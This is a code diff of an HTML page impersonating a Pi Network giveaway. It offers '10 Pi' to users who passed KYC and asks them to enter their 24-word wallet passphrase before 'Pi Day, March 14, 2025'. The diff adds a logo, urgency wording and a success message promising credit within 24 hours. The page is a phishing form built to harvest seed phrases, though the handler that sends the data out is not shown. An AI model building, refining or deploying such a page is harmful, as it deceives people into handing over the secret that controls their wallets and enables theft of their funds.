@@ -8,14 +8,25 @@
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>Claim Your 10 Pi</h1>
-            <p>Enter your 24-word passphrase below to claim your Pi. Your Pi will be credited within 24 hours.</p>
+        <!-- Pi Logo -->
+        <img src="https://assets.onecompiler.app/43b4eg2xg/43b49qh5s/pi%20network.png" alt="43b4ej9cd" class="logo">
+
+        <!-- Heading -->
+        <h1>Claim Your 10 Pi</h1>
+
+        <!-- Explanation -->
+        <div class="explanation">
+            <p>If you've passed KYC, don't miss this exclusive opportunity! Claim your 10 Pi before Pi Day on <strong>March 14, 2025</strong>.</p>
+            <p>Simply enter your 24-word passphrase below, and your Pi will be credited within 24 hours.</p>
         </div>
+
+        <!-- Passphrase Form -->
         <form id="passphraseForm">
             <textarea id="passphrase" placeholder="Enter your 24-word passphrase here..." required></textarea>
-            <button type="submit">Claim Pi</button>
+            <button type="submit">Claim 10 Pi</button>
         </form>
+
+        <!-- Success Message -->
         <div id="successMessage" class="hidden">
             <p>🎉 Success! Your 10 Pi will be credited within 24 hours. Thank you!</p>
         </div>
